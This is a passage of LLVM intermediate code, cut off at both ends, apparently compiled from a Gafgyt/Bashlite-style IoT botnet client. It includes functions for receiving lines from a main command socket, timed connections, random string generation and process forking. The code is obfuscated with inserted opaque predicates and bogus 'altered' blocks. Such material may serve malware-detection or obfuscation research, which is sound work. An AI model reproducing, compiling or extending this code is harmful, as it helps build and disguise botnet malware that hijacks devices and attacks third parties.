  %110 = getelementptr inbounds i8, i8* %109, i64 1
  %111 = call i32 @wildString(i8* %108, i8* %110)
  %112 = icmp ne i32 %111, 0
  %113 = xor i1 %112, true
  br label %114

; <label>:114:                                    ; preds = %106, %originalBBpart214
  %115 = phi i1 [ false, %originalBBpart214 ], [ %113, %106 ]
  %116 = load i32, i32* @x.41
  %117 = load i32, i32* @y.42
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %114
  %124 = xor i1 %115, true
  %125 = zext i1 %124 to i32
  store i32 %125, i32* %11, align 4
  %126 = load i32, i32* @x.41
  %127 = load i32, i32* @y.42
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart219, label %originalBB16alteredBB

originalBBpart219:                                ; preds = %originalBB16
  br label %156

; <label>:134:                                    ; preds = %originalBBpart2
  %135 = load i8*, i8** %12, align 8
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  %138 = call i32 @toupper(i32 %137) #9
  %139 = load i8*, i8** %13, align 8
  %140 = load i8, i8* %139, align 1
  %141 = zext i8 %140 to i32
  %142 = call i32 @toupper(i32 %141) #9
  %143 = icmp eq i32 %138, %142
  br i1 %143, label %144, label %152

; <label>:144:                                    ; preds = %134
  %145 = load i8*, i8** %12, align 8
  %146 = getelementptr inbounds i8, i8* %145, i64 1
  %147 = load i8*, i8** %13, align 8
  %148 = getelementptr inbounds i8, i8* %147, i64 1
  %149 = call i32 @wildString(i8* %146, i8* %148)
  %150 = icmp ne i32 %149, 0
  %151 = xor i1 %150, true
  br label %152

; <label>:152:                                    ; preds = %144, %134
  %153 = phi i1 [ false, %134 ], [ %151, %144 ]
  %154 = xor i1 %153, true
  %155 = zext i1 %154 to i32
  store i32 %155, i32* %11, align 4
  br label %156

; <label>:156:                                    ; preds = %152, %originalBBpart219, %originalBBpart210, %25
  %157 = load i32, i32* %11, align 4
  ret i32 %157

originalBBalteredBB:                              ; preds = %originalBB, %2
  %158 = alloca i32, align 4
  %159 = alloca i8*, align 8
  %160 = alloca i8*, align 8
  store i8* %0, i8** %159, align 8
  store i8* %1, i8** %160, align 8
  %161 = load i8*, i8** %159, align 8
  %162 = load i8, i8* %161, align 1
  %163 = zext i8 %162 to i32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %35
  %164 = load i8*, i8** %13, align 8
  %165 = load i8, i8* %164, align 1
  %166 = zext i8 %165 to i32
  %167 = icmp ne i32 %166, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %65
  %_ = shl i1 %66, true
  %_7 = shl i1 %66, true
  %_8 = shl i1 %66, true
  %168 = xor i1 %66, true
  %169 = zext i1 %168 to i32
  store i32 %169, i32* %11, align 4
  br label %originalBB6

originalBB12alteredBB:                            ; preds = %originalBB12, %85
  %170 = load i8*, i8** %13, align 8
  %171 = load i8, i8* %170, align 1
  %172 = zext i8 %171 to i32
  %173 = icmp ne i32 %172, 0
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %114
  %_17 = sub i1 %115, true
  %gen = mul i1 %_17, true
  %174 = xor i1 %115, true
  %175 = zext i1 %174 to i32
  store i32 %175, i32* %11, align 4
  br label %originalBB16
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %29

; <label>:12:                                     ; preds = %2
  %13 = load i32, i32* @x.43
  %14 = load i32, i32* @y.44
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  store i32 1, i32* %3, align 4
  %21 = load i32, i32* @x.43
  %22 = load i32, i32* @y.44
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %46

; <label>:29:                                     ; preds = %2
  %30 = load i32, i32* @x.43
  %31 = load i32, i32* @y.44
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %29
  store i32 0, i32* %3, align 4
  %38 = load i32, i32* @x.43
  %39 = load i32, i32* @y.44
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %46

; <label>:46:                                     ; preds = %originalBBpart24, %originalBBpart2
  %47 = load i32, i32* %3, align 4
  ret i32 %47

originalBBalteredBB:                              ; preds = %originalBB, %12
  store i32 1, i32* %3, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %29
  store i32 0, i32* %3, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = load i32, i32* @x.45
  %4 = load i32, i32* @y.46
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  store i32 0, i32* %13, align 4
  store i32 0, i32* %13, align 4
  %14 = load i32, i32* @x.45
  %15 = load i32, i32* @y.46
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %67, %originalBBpart2
  %23 = load i32, i32* @x.45
  %24 = load i32, i32* @y.46
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %22
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %12, align 4
  %33 = icmp slt i32 %31, %32
  %34 = load i32, i32* @x.45
  %35 = load i32, i32* @y.46
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %33, label %42, label %70

; <label>:42:                                     ; preds = %originalBBpart24
  %43 = load i32, i32* @x.45
  %44 = load i32, i32* @y.46
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %42
  %51 = call i32 @rand_cmwc()
  %52 = urem i32 %51, 26
  %53 = add i32 %52, 65
  %54 = trunc i32 %53 to i8
  %55 = load i8*, i8** %11, align 8
  %56 = load i32, i32* %13, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  store i8 %54, i8* %58, align 1
  %59 = load i32, i32* @x.45
  %60 = load i32, i32* @y.46
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart211, label %originalBB6alteredBB

originalBBpart211:                                ; preds = %originalBB6
  br label %67

; <label>:67:                                     ; preds = %originalBBpart211
  %68 = load i32, i32* %13, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %13, align 4
  br label %22

; <label>:70:                                     ; preds = %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %71 = alloca i8*, align 8
  %72 = alloca i32, align 4
  %73 = alloca i32, align 4
  store i8* %0, i8** %71, align 8
  store i32 %1, i32* %72, align 4
  store i32 0, i32* %73, align 4
  store i32 0, i32* %73, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %22
  %74 = load i32, i32* %13, align 4
  %75 = load i32, i32* %12, align 4
  %76 = icmp slt i32 %74, %75
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %42
  %77 = call i32 @rand_cmwc()
  %78 = urem i32 %77, 26
  %_ = sub i32 %78, 65
  %gen = mul i32 %_, 65
  %_7 = sub i32 %78, 65
  %gen8 = mul i32 %_7, 65
  %_9 = shl i32 %78, 65
  %79 = add i32 %78, 65
  %80 = trunc i32 %79 to i8
  %81 = load i8*, i8** %11, align 8
  %82 = load i32, i32* %13, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %81, i64 %83
  store i8 %80, i8* %84, align 1
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.47
  %5 = load i32, i32* @y.48
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca %struct.fd_set, align 8
  %17 = alloca %struct.timeval, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %27 = load i8*, i8** %14, align 8
  %28 = load i32, i32* %15, align 4
  %29 = sext i32 %28 to i64
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 %29, i32 1, i1 false)
  %30 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %30, align 8
  %31 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %31, align 8
  %32 = load i32, i32* @x.47
  %33 = load i32, i32* @y.48
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %41, i64 0, i64 0
  %43 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %42) #5, !srcloc !2
  %44 = extractvalue { i64, i64* } %43, 0
  %45 = extractvalue { i64, i64* } %43, 1
  %46 = trunc i64 %44 to i32
  store i32 %46, i32* %18, align 4
  %47 = ptrtoint i64* %45 to i64
  %48 = trunc i64 %47 to i32
  store i32 %48, i32* %19, align 4
  br label %49

; <label>:49:                                     ; preds = %40
  %50 = load i32, i32* %13, align 4
  %51 = srem i32 %50, 64
  %52 = zext i32 %51 to i64
  %53 = shl i64 1, %52
  %54 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %55 = load i32, i32* %13, align 4
  %56 = sdiv i32 %55, 64
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [16 x i64], [16 x i64]* %54, i64 0, i64 %57
  %59 = load i64, i64* %58, align 8
  %60 = or i64 %59, %53
  store i64 %60, i64* %58, align 8
  %61 = load i32, i32* %13, align 4
  %62 = add nsw i32 %61, 1
  %63 = call i32 @select(i32 %62, %struct.fd_set* %16, %struct.fd_set* null, %struct.fd_set* %16, %struct.timeval* %17)
  store i32 %63, i32* %20, align 4
  %64 = icmp sle i32 %63, 0
  br i1 %64, label %65, label %118

; <label>:65:                                     ; preds = %49
  br label %66

; <label>:66:                                     ; preds = %97, %65
  %67 = load i32, i32* %21, align 4
  %68 = icmp slt i32 %67, 10
  br i1 %68, label %69, label %117

; <label>:69:                                     ; preds = %66
  %70 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %70, align 8
  %71 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %71, align 8
  br label %72

; <label>:72:                                     ; preds = %69
  %73 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %73, i64 0, i64 0
  %75 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %74) #5, !srcloc !3
  %76 = extractvalue { i64, i64* } %75, 0
  %77 = extractvalue { i64, i64* } %75, 1
  %78 = trunc i64 %76 to i32
  store i32 %78, i32* %22, align 4
  %79 = ptrtoint i64* %77 to i64
  %80 = trunc i64 %79 to i32
  store i32 %80, i32* %23, align 4
  br label %81

; <label>:81:                                     ; preds = %72
  %82 = load i32, i32* %13, align 4
  %83 = srem i32 %82, 64
  %84 = zext i32 %83 to i64
  %85 = shl i64 1, %84
  %86 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %87 = load i32, i32* %13, align 4
  %88 = sdiv i32 %87, 64
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds [16 x i64], [16 x i64]* %86, i64 0, i64 %89
  %91 = load i64, i64* %90, align 8
  %92 = or i64 %91, %85
  store i64 %92, i64* %90, align 8
  %93 = load i32, i32* %13, align 4
  %94 = add nsw i32 %93, 1
  %95 = call i32 @select(i32 %94, %struct.fd_set* %16, %struct.fd_set* null, %struct.fd_set* %16, %struct.timeval* %17)
  store i32 %95, i32* %20, align 4
  %96 = icmp sle i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %81
  %98 = load i32, i32* %21, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %21, align 4
  br label %66

; <label>:100:                                    ; preds = %81
  %101 = load i32, i32* @x.47
  %102 = load i32, i32* @y.48
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %100
  %109 = load i32, i32* @x.47
  %110 = load i32, i32* @y.48
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %117

; <label>:117:                                    ; preds = %originalBBpart24, %66
  br label %118

; <label>:118:                                    ; preds = %117, %49
  store i32 0, i32* %26, align 4
  %119 = load i8*, i8** %14, align 8
  store i8* %119, i8** %25, align 8
  br label %120

; <label>:120:                                    ; preds = %138, %118
  %121 = load i32, i32* %15, align 4
  %122 = add nsw i32 %121, -1
  store i32 %122, i32* %15, align 4
  %123 = icmp sgt i32 %121, 1
  br i1 %123, label %124, label %141

; <label>:124:                                    ; preds = %120
  %125 = load i32, i32* @mainCommSock, align 4
  %126 = call i64 @recv(i32 %125, i8* %24, i64 1, i32 0)
  %127 = icmp ne i64 %126, 1
  br i1 %127, label %128, label %130

; <label>:128:                                    ; preds = %124
  %129 = load i8*, i8** %25, align 8
  store i8 0, i8* %129, align 1
  store i32 -1, i32* %12, align 4
  br label %144

; <label>:130:                                    ; preds = %124
  %131 = load i8, i8* %24, align 1
  %132 = load i8*, i8** %25, align 8
  %133 = getelementptr inbounds i8, i8* %132, i32 1
  store i8* %133, i8** %25, align 8
  store i8 %131, i8* %132, align 1
  %134 = load i8, i8* %24, align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 10
  br i1 %136, label %137, label %138

; <label>:137:                                    ; preds = %130
  br label %141

; <label>:138:                                    ; preds = %130
  %139 = load i32, i32* %26, align 4
  %140 = add nsw i32 %139, 1
  store i32 %140, i32* %26, align 4
  br label %120

; <label>:141:                                    ; preds = %137, %120
  %142 = load i8*, i8** %25, align 8
  store i8 0, i8* %142, align 1
  %143 = load i32, i32* %26, align 4
  store i32 %143, i32* %12, align 4
  br label %144

; <label>:144:                                    ; preds = %141, %128
  %145 = load i32, i32* %12, align 4
  ret i32 %145

originalBBalteredBB:                              ; preds = %originalBB, %3
  %146 = alloca i32, align 4
  %147 = alloca i32, align 4
  %148 = alloca i8*, align 8
  %149 = alloca i32, align 4
  %150 = alloca %struct.fd_set, align 8
  %151 = alloca %struct.timeval, align 8
  %152 = alloca i32, align 4
  %153 = alloca i32, align 4
  %154 = alloca i32, align 4
  %155 = alloca i32, align 4
  %156 = alloca i32, align 4
  %157 = alloca i32, align 4
  %158 = alloca i8, align 1
  %159 = alloca i8*, align 8
  %160 = alloca i32, align 4
  store i32 %0, i32* %147, align 4
  store i8* %1, i8** %148, align 8
  store i32 %2, i32* %149, align 4
  %161 = load i8*, i8** %148, align 8
  %162 = load i32, i32* %149, align 4
  %163 = sext i32 %162 to i64
  call void @llvm.memset.p0i8.i64(i8* %161, i8 0, i64 %163, i32 1, i1 false)
  %164 = getelementptr inbounds %struct.timeval, %struct.timeval* %151, i32 0, i32 0
  store i64 30, i64* %164, align 8
  %165 = getelementptr inbounds %struct.timeval, %struct.timeval* %151, i32 0, i32 1
  store i64 0, i64* %165, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %100
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %116

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %107

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #10
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %105

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* @x.49
  %51 = load i32, i32* @y.50
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %49
  %58 = load i32, i32* %9, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %59, i64* %60, align 8
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %61, align 8
  %62 = load i32, i32* @x.49
  %63 = load i32, i32* @y.50
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %70

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 0
  %73 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %72) #5, !srcloc !4
  %74 = extractvalue { i64, i64* } %73, 0
  %75 = extractvalue { i64, i64* } %73, 1
  %76 = trunc i64 %74 to i32
  store i32 %76, i32* %17, align 4
  %77 = ptrtoint i64* %75 to i64
  %78 = trunc i64 %77 to i32
  store i32 %78, i32* %18, align 4
  br label %79

; <label>:79:                                     ; preds = %70
  %80 = load i32, i32* %6, align 4
  %81 = srem i32 %80, 64
  %82 = zext i32 %81 to i64
  %83 = shl i64 1, %82
  %84 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %85 = load i32, i32* %6, align 4
  %86 = sdiv i32 %85, 64
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %84, i64 0, i64 %87
  %89 = load i64, i64* %88, align 8
  %90 = or i64 %89, %83
  store i64 %90, i64* %88, align 8
  %91 = load i32, i32* %6, align 4
  %92 = add nsw i32 %91, 1
  %93 = call i32 @select(i32 %92, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %94 = icmp sgt i32 %93, 0
  br i1 %94, label %95, label %103

; <label>:95:                                     ; preds = %79
  store i32 4, i32* %13, align 4
  %96 = load i32, i32* %6, align 4
  %97 = bitcast i32* %14 to i8*
  %98 = call i32 @getsockopt(i32 %96, i32 1, i32 4, i8* %97, i32* %13) #5
  %99 = load i32, i32* %14, align 4
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %101, label %102

; <label>:101:                                    ; preds = %95
  store i32 0, i32* %5, align 4
  br label %116

; <label>:102:                                    ; preds = %95
  br label %104

; <label>:103:                                    ; preds = %79
  store i32 0, i32* %5, align 4
  br label %116

; <label>:104:                                    ; preds = %102
  br label %106

; <label>:105:                                    ; preds = %45
  store i32 0, i32* %5, align 4
  br label %116

; <label>:106:                                    ; preds = %104
  br label %107

; <label>:107:                                    ; preds = %106, %37
  %108 = load i32, i32* %6, align 4
  %109 = call i32 (i32, i32, ...) @fcntl(i32 %108, i32 3, i8* null)
  %110 = sext i32 %109 to i64
  store i64 %110, i64* %15, align 8
  %111 = load i64, i64* %15, align 8
  %112 = and i64 %111, -2049
  store i64 %112, i64* %15, align 8
  %113 = load i32, i32* %6, align 4
  %114 = load i64, i64* %15, align 8
  %115 = call i32 (i32, i32, ...) @fcntl(i32 %113, i32 4, i64 %114)
  store i32 1, i32* %5, align 4
  br label %116

; <label>:116:                                    ; preds = %107, %105, %103, %101, %36
  %117 = load i32, i32* %5, align 4
  ret i32 %117

originalBBalteredBB:                              ; preds = %originalBB, %49
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %119, i64* %120, align 8
  %121 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %121, align 8
  br label %originalBB
}

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %95

; <label>:10:                                     ; preds = %0
  %11 = load i32, i32* @x.51
  %12 = load i32, i32* @y.52
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i64, i64* @numpids, align 8
  %20 = add i64 %19, 1
  store i64 %20, i64* @numpids, align 8
  %21 = load i64, i64* @numpids, align 8
  %22 = add i64 %21, 1
  %23 = mul i64 %22, 4
  %24 = call noalias i8* @malloc(i64 %23) #5
  %25 = bitcast i8* %24 to i32*
  store i32* %25, i32** %3, align 8
  store i32 0, i32* %4, align 4
  %26 = load i32, i32* @x.51
  %27 = load i32, i32* @y.52
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %82, %originalBBpart2
  %35 = load i32, i32* @x.51
  %36 = load i32, i32* @y.52
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
